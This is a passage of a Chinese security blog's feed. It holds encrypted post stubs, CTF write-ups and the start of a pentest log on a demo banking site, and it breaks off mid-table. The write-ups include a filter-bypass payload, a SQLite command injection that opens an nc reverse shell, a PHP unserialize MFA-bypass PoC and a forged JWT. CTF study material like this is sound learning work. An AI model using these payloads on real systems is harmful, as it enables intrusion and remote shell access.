f52624aff361d45384c508a787e203f0f5134c3252a65e146e7dd7c02183ff9e103ae5e05d8b593519ecd9d4b951437ed37cc5c93b117b8dda3ddcce9d52f9a9a05eff789bf6e6b89f6df67e9bc789412efaa8b1c923c83b135ff855f22d692c57bfcf8db2334e1953e97ae2d6ff133a16b342052845e189ef7e7b4797c27e0e6037219f79296a0c2498c429f8d3ba3183d811ee28ec67d56be07b4c975bf1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">内网隧道应用</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/21/%E6%9A%91%E5%81%87-7/"/>
    <id>http://upload.love/2021/07/21/%E6%9A%91%E5%81%87-7/</id>
    <published>2021-07-21T01:31:41.000Z</published>
    <updated>2021-07-22T11:04:47.243Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="395d516173c9b2f358af66532f21b641de875f3103e8c14e3063a4b9a646f332">bd3972b2f1d8b4a8c60dbd643b57ed4097e64c42ee0708c735adcbe51889fd17bd92f518eccc4384a78c39d7b7f2599ef8f56088f21884e63b9d7daaa1f3641973ca5312d69ef6b78a6b04e1e0fbf2e5f3c9a5fef82182cb8f16dd4740a9e8de39923e76502d8dff5d37ef6edab2cae3cee7dbd23a457018035f127b3f8482ebcab714085cce45e6fc4b7864509fdcc9e6920a306581273e5050ee3e4cae2b4d901bccf8739fe7752537eefbcdde179bf60a30216528117d7568274aeac5f830cec8a59fb6ec410aec65851b05214dbf8d1bec2bfcfed4aadd4f0084db2c406b341adf95ee9bb38f51c00a45bfb06b6ed73266f35d24ada570d8c19c0948f5d07ca27624488a687046c98054e39a9110754d6011401e25948f86e4d4c8a91566c94e9747decf3e41176814efe79a398d652bf5cd5b40b5258945b1ff7064d74cd8a497e73081f1fd12bce1acefd073627108f76a8820a94acb3335f38306e5ee132092765c4dd2540ffda703080204b13188916e2f55ff26ba9c158ed4f96931e55049195c0c60da2f32669ec9935825d9d2cdde1bb132673b150c48f0868e1f37fee9a82af5359d594020a3b2fecbd25a0b34edbbf6ecb54873f438c95c44eac4b7cbf226e74ca792e1e40f978b00c6262345393f3fb682c16940de461bc8c188b59cf4ef60a8518d0f1f9fb74299350d44a6f27e96dec492e7ed7036699895d8e45a8f4deafa43be73a23d588ac3a0c67a3e02c9dc1e56aff715fdaf670190dae6a5dfd04a92d6673b0902ce1b9a1defbaec5e843c92eb7f1326ac0c376534ebab0c5d6166814e0f10f73efaca233c3d24c3128bed8ffcda5ec294e2a99f5310e21e5c4f47b6ccbdbf69da4eed0240a6d564d09ea57b5b22742ad75e2bf877a095d39d3324327b28220ba699769e963fafd2de89531b7ad7d9eb17b69a5941c495aef29b6dc9d90436f75856d0d53f0a11d272cc421b58b70dcb1a9acf651e4dcc0631aee74e1152b3f9c0c3258123309df11ee54312c4a94db1d466746d6ab6043f20ba53ce2ede7b69c732131112fd3a9f7a7058462a20c65d34e065cd8765e97eb46db2b1be91dc2da6105d929e5d61ecfc879defc6317c9d47480cce01376b65b9dbf19d547b2cfd7a93efb34f216a8580d4b6b8f248adb2506deab4071ab7f26384d7e6e75e843fd946a21cc45058ff8cc8902a6812758334ddc5ea7f7516a0efdb5bc0da166642b7e75ad9154b796e10526ce1c3a76997ce08e76f163f1db3b8929b3c58f0c95c7abfba499ed6b56277e8a67a8c4d131130046b28639ddc40f403853e24fc9f6aa18daa54b8290e9f1c2658ad2c21f25c4919cc4c8aefeed10441fbbe445f43f772782fb0423aaeb0b693939fc416c7209088a534774f94c6a3b206379b22b14a990e24e92938b5e9c7f199346bec3029455147ca2c730d4eeee435d3c017c16f6924dc71a193cdb86bbbaca7a0406422e9288204e77d5f6db49c10d47db9c0b4187922f917c4e83aa01a3c2ae263b85e05ffb9a9c7c5579fa6a3f3b3c087651a3b6c3057b79caa5f257e8f0edb4eb04ad5ec59f018</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">随便学</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/20/%E6%9A%91%E5%81%87-6/"/>
    <id>http://upload.love/2021/07/20/%E6%9A%91%E5%81%87-6/</id>
    <published>2021-07-20T09:47:09.000Z</published>
    <updated>2021-07-24T08:00:55.466Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="3a9c9ba776665feb67390b330dd1aebb90c13889b9b4cbaaabe04b028655be8f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">操作系统</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/20/%E6%9A%91%E5%81%87-5/"/>
    <id>http://upload.love/2021/07/20/%E6%9A%91%E5%81%87-5/</id>
    <published>2021-07-20T01:07:57.000Z</published>
    <updated>2021-07-22T11:02:33.735Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="43b2f39e30590d8a582291d684e40dd014332a496deef82bc5f6bff1128d0978">bd3972b2f1d8b4a8c60dbd643b57ed4097e64c42ee0708c735adcbe51889fd173081dc314afade792a19194d60b93299ddbe8a61de157c074b9a23a268a817f369476262d2d0dc61b822e6e230ae14b6065c19347842ecddc2ed8faf500ca32a25712b6aa38b8db796157e7c092a68f340048c679a415b35f43323fb71a2edb694073c58da87b9d6043c2085a5abacc6339da0781fc7afcf76c06c71c7eab29ceb51d20f67a4d5f35c42922ca5742f267e767fb864475514024b2c668fca1b85fddd3e0fb0c1d603a3387f65b9c66e6aa50805a707f065c317077cf2b440cfbc64ac4fbc2d99a3055380b2d87885d65a0a41dcda863746c2636328da1463002b244fe38bcf8648e65a5b14d98b1ee10e33cb74c0cb9c9a348acac2dff147ab6410e49b8f84866d657588e7cb990ff082d8c5530af6ff37f45c071f38d9c826212417854cd7403622fe72e14ec95873a7e14d2bfa88656f50ab5f497f38a9f9dd57a83dbaf3cf294dbb481db679160b68b5eda8cd19765654691a80a0bd994889cbc3d979c29240789d78cd6c0855bbd5be84e48e1c4eda10b23bff3087a08fc977abd774b6aed572638b03c38eda7308e00f2811c8c3ae1b27dda6b907b2c7f8b7c71cfb0f385fc4ab6b5847b59f5514c3e5710c531153d1686dbd615df2f3ce1090b0d87f2b6695d10a4332cb8925450ba7c813ced05c176a5bd0cb60b3999b6737846101063b052be453ae7ef594a9ec336d4ac9f751b3ca416280372c4ec2364328aed5911b4688fdb877443906587b27b42f1e284dbe65276cefc06d32a6895b09210d08da58b4152bfcde2577dfbcdeee218e5723043438a285ee8454f0710c20df80728771cbe2314443592c382c79be5497120bbafccd620a8ed7980d95dbd6b95e975446e3d15dcfd035ad0e0423b4a44e73763f7c01fd5ac1416dc70a0f80f580e09a5405386f081fae70f661b902d7a8f68eeba27a953541fc8c9357f575825d97e5c9e640d9b2b5d92ddacb6852c8b839c2edc1403599ec72745536dde7e11f924ec2eafd68291d463b309a138c285071bdf45af81536b7baf38cf958645482af3f792320830b9096b5dc01dc18bf7bc81a99be7361b4ca9b3e76279bf096d120a7698ad34803f43c712d523e4df28543f90e66420791bbe429fabce1e32b5b1eb155fc3d0bc24d0fca54582cb923134762e34864f4e689cce6d097a8e1c5f7904741747a05339088456e0b8a59006c9d06f000b9b9db03dc1289423f70c995d7d09eb2472896cd1440a0bfd9860c11e14858b1042caf236f87e5259c0456a4bc73e6e43624b0dd0075f4938da299bd4e1a554ac827cefc2751173eff5d8caf5f660039405f68e0fdc8a804dcddf2049d4b6d360d9bf89f933ca3e72743e6d21b6cdf6d089705acdc605e174daf4d9cd05d9265098af107b1f4a886865275de956b4e439a3146df748e9184ed3c4b8bf58f64d0f0d88bbde755f590001b1045fa6ad706b38201425c6a29600a8074900f9d3d18d4f124a95a2adc1591bc503e0167c6d548f19422c606a06baa6c4cd824da9c03fbc75be899f9e62581dece8e551cdea0cf2d78f64f6a59842fbebbe37fc441d7b577d8cf04a4c407240d7373701067ffd40260d624f5c01a8d05e346ade1ad5ab751d63a9e5bd013600464b9e30b710e15d3edf791977a5307f95746a730672310380e7cbbff92f7d0ec2719f0fc1ef497fca1ef1366884f470232a73c50cd49ca59eaf03288c13c0c852d3ce500c18ccdb251d83533f4e717d111243c84734d0342ab6478b6e51295c1941d7af87429d3d93780c90a6bcb10335df37eac5db62e9c650b55b626f95e562d63d7905123a3b62f5f19555ee74d01959fa6f5637742d3578830fe9874c46e599cb5e9a56205c02fa6421c275f1813ea96fe474c9d14086ac962df8694f5b8a15ca4b98aa5ef4be632d47d36e94d464aa0ce64a6d6cad415355530c808351446562e25b0e5f27d040723f00ec9ac5360adb834748d08e4eafddbf7df8d2bf95ae63ed33d243899eee69c4fe1d428b3f46c4732556beef56b0e906b7695a63e04989ce4a029ef28b87a11507db1e033708bb027fd69a3c5f04bd8876c6987062bc4ecba65b122e2d0f97b818c5c6bb46ce11fe9bf60395643dc8a4bfe1d02b9f4a73f8006a67101fcb1a11042576bd348662c0786c3fb72f8901291b44699595be68753ec9b88612785fb322cf3c352ad159ea4aa184ba8fd30fd8a1746f6f8e8b6deb4c1dc5df8db4bf5108c6d6bd7ab648f30777bb6a142b08fcbc6fd9d46607a6ae6d5253acc7b67bd8874372ed08720e70bb1c0bf9821a9ce7b846b00489f610127e50852337f2fab6a64145fe17a28170ea6e4a8b63d45bf328234e1523dab42a376a89b4e33b3453779fc1122d2298598f5cfa3fd6abdb13223b90f136b9d138070e0fe163e7abc9d7c0dd1f3f0470a0d6b4411174150fe38ecb2e7e8949ced73c571a864d00a7423b5d53834359718c36c0515b4b07d8aeb843d2146ed995d6a9355c153d80e17f5de648e4558224333169e04f818f246ec5f1889fb62eaef7a2a361d75c9daaf462569b00be214ca74ff5fbeb93640cee8b133475fd02429af56d1574965776362377ff5660dbf3488ac19373e0ea0b77e2aad7e58ec966e85aef163e17ca65b399559d1041617656167c35a2d1ded10ffddb405256c832d651df40805b0794636f5a0b59c71296e00636f4fa62a20f8cc0d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">内网</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/19/%E6%9A%91%E5%81%87-4/"/>
    <id>http://upload.love/2021/07/19/%E6%9A%91%E5%81%87-4/</id>
    <published>2021-07-19T01:27:16.000Z</published>
    <updated>2021-07-29T07:41:52.976Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="1d7652344f08fe154f114fcec83a6a158d3238e67ee592959e834877468c2903"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">提权</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>车联网安全</title>
    <link href="http://upload.love/2021/07/17/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>http://upload.love/2021/07/17/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2021-07-17T13:51:49.000Z</published>
    <updated>2021-07-17T13:57:25.574Z</updated>
    
    <content type="html"><![CDATA[<h1 id="绕过检测是一门艺术"><a href="#绕过检测是一门艺术" class="headerlink" title="绕过检测是一门艺术"></a>绕过检测是一门艺术</h1><p>直接绕过过滤payload:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dir .</span><br><span class="line">cut%09<span class="_">-d</span>%091-1000%09CvvD_F14g_1s_h4rehaha.php%09</span><br></pre></td></tr></table></figure><h1 id="答案不在数据库里"><a href="#答案不在数据库里" class="headerlink" title="答案不在数据库里"></a>答案不在数据库里</h1><p>发现是sqllite数据库！</p><p>根据sqllite数据库的特性编写exp!</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5a909f09-ab93-42c7-9db9-5b98b7ab1b25.ctf.moonback.xyz:8001/&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.system nc 794689786 1 -e sh\n&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> len(username) &lt;= <span class="number">32</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hi&quot;</span>&#125;</span><br><span class="line">res = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/login&quot;</span>, data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h1 id="SQL注入解决不了问题"><a href="#SQL注入解决不了问题" class="headerlink" title="SQL注入解决不了问题"></a>SQL注入解决不了问题</h1><p>index.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class/User.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// serialise POST data for easy logging</span></span><br><span class="line">$loginAttempt = serialize((<span class="keyword">object</span>)$_POST);</span><br><span class="line"></span><br><span class="line"><span class="comment">// log access</span></span><br><span class="line"><span class="comment">//Logger::log(Logger::SENSITIVE, &#x27;Login attempt: &#x27; . $loginAttempt);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Hand over to federation login</span></span><br><span class="line"><span class="comment">// TODO currently just a mock up</span></span><br><span class="line"><span class="comment">// TODO encrypt information to avoid loos of confidentiality</span></span><br><span class="line">header(<span class="string">&#x27;Location: /?userdata=&#x27;</span> . base64_encode($loginAttempt));</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;userdata&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// prepare notification data structure</span></span><br><span class="line">$notification = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// check credentials &amp; MFA</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$user = <span class="keyword">new</span> User(base64_decode($_GET[<span class="string">&#x27;userdata&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> ($user-&gt;verify())</span><br><span class="line">&#123;</span><br><span class="line">$notification-&gt;type = <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">$notification-&gt;text = <span class="string">&#x27;Congratulations, your flag is: &#x27;</span> . file_get_contents(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Invalid credentials or MFA token value&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line">$notification-&gt;type = <span class="string">&#x27;danger&#x27;</span>;</span><br><span class="line">$notification-&gt;text = $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;template/home.html&#x27;</span>;</span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $userData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$loginAttempt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userData = unserialize($loginAttempt);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;userData)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Unable to reconstruct user data&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userData-&gt;username === <span class="string">&#x27;D0loresH4ze&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;userData-&gt;password, <span class="string">&#x27;$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyMFA</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userData-&gt;_correctValue = random_int(<span class="number">1e10</span>, <span class="number">1e11</span> - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;userData-&gt;mfa === <span class="keyword">$this</span>-&gt;userData-&gt;_correctValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;verifyUsername())</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Invalid username&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;verifyPassword())</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;verifyMFA())</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;Invalid MFA token value&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过限制：</p><p>第一次检查是很容易的,设置用户名 <code>D0loresH4ze </code>。</p><p>谷歌搜索的散列密码告诉我们 <code>rasmuslerdorf </code>。</p><p>第三个检查是MFA绕过:</p><p>可以用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user-&gt;mfa =&amp; $user-&gt;_correctValue;</span><br></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $username &#x3D; &quot;D0loresH4ze&quot;;</span><br><span class="line">    public $password &#x3D; &quot;rasmuslerdorf&quot;;</span><br><span class="line">    public $mfa;</span><br><span class="line">    public $_correctValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$user-&gt;mfa &#x3D;&amp; $user-&gt;_correctValue;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($user));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjExOiJEMGxvcmVzSDR6ZSI7czo4OiJwYXNzd29yZCI7czoxMzoicmFzbXVzbGVyZG9yZiI7czozOiJtZmEiO2k6MTtzOjEzOiJfY29ycmVjdFZhbHVlIjtSOjQ7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h1 id="你需要认真观察，才能找到JWT的秘密"><a href="#你需要认真观察，才能找到JWT的秘密" class="headerlink" title="你需要认真观察，才能找到JWT的秘密"></a>你需要认真观察，才能找到JWT的秘密</h1><p><a href="https://dunsp4rce.github.io/csictf-2020/web/2020/07/22/CCC.html">wp</a></p><p>发现有<code>adminnames</code> 可以下载</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215201.png" alt="image-20210508143431017"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215201.png" alt="image-20210508143515711"></p><p>去 <a href="https://jwt.io/">jwt</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;username&quot;</span>: <span class="string">&quot;nqzva&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;nqzva&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;admin&quot;</span>: <span class="string">&quot;snyfr&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1593506966</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JWT_SECRET&#x3D;Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1</span><br></pre></td></tr></table></figure><p>数据包：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.104:8004</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Authorization</span>: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImVicmVidW5hIiwicGFzc3dvcmQiOiIiLCJhZG1pbiI6ImdlaHIiLCJpYXQiOjE1OTUzNDAwMDB9.m2y399u-xdRyzhpkix-stYf1SmHrXRp53Wq_I29y3mY</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: __cfduid=d10b0dd80a123d45a9dabfaadb24dbc801595326165;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">车联网安全</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>渗透小结</title>
    <link href="http://upload.love/2021/07/17/%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93/"/>
    <id>http://upload.love/2021/07/17/%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93/</id>
    <published>2021-07-17T13:51:40.000Z</published>
    <updated>2021-07-17T13:54:32.442Z</updated>
    
    <content type="html"><![CDATA[<p>5</p><h1 id="记一下渗透测试"><a href="#记一下渗透测试" class="headerlink" title="记一下渗透测试"></a>记一下渗透测试</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><code>testfire.net</code></p><p>没<code>CDN</code></p><h3 id="信息收集下："><a href="#信息收集下：" class="headerlink" title="信息收集下："></a>信息收集下：</h3><p>因为是单一的站点 就测一下指纹：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210426202141917"></p><p>单一的<code>url</code>! 看看有没有啥旁站啥的！ </p><h4 id="看看子域名"><a href="#看看子域名" class="headerlink" title="看看子域名"></a>看看子域名</h4><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210426202414222"></p><table><thead><tr><th align="center">序号</th><th>子域名</th><th>标题</th><th><code>IP</code>地址</th><th>服务</th></tr></thead><tbody><tr><td align="center">1</td><td><a href="http://demo.testfire.net/">demo.testfire.net</a></td><td><code>Altoro Mutual</code></td><td>65.61.137.117</td><td>Apache-Coyote/1.1</td></tr><tr><td align="center">2</td><td><a href="http://www.testfire.net/">www.testfire.net</a></td><td><code>Altoro Mutual</code></td><td>65.61.137.117</td><td>Apache-Coyote/1.1</td></tr><tr><td align="center">3</td><td><a href="http://testfire.net/">testfire.net</a></td><td><code>Altoro Mutual</code></td><td>65.61.137.117</td><td>Apache-Coyote/1.1</td></tr></tbody></table><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h4><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210426202727405"></p><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p>先上常用的扫描器！ 扫一扫</p><p><code>存在 sql注入 xss 等等漏洞</code>  </p><h3 id="手工-xray联合测试"><a href="#手工-xray联合测试" class="headerlink" title="手工+xray联合测试"></a>手工+<code>xray</code>联合测试</h3><p><strong>手工 测试一下 扫描器的漏洞！</strong> </p><p>先 找其中一个站点</p><p>扫描 | 爬取一下 目录结构(<code>java</code>站点)   </p><p><code>namp</code>跑一下看下 系统 win系统  试了试不是<code>win</code> 还是个<code>linux</code>系统</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210426232047427"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210426203630454"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717215219.png" alt="image-20210427152925989"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210427153003.png" alt="image-20210427153003879"></p><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>扫描结果</p><p>302 页面都跳转到：</p><p><code>http://65.61.137.117:8080/login.jsp</code></p><p>发现存在弱口令漏洞：</p><figure class="highlight plain"><table><tr><td 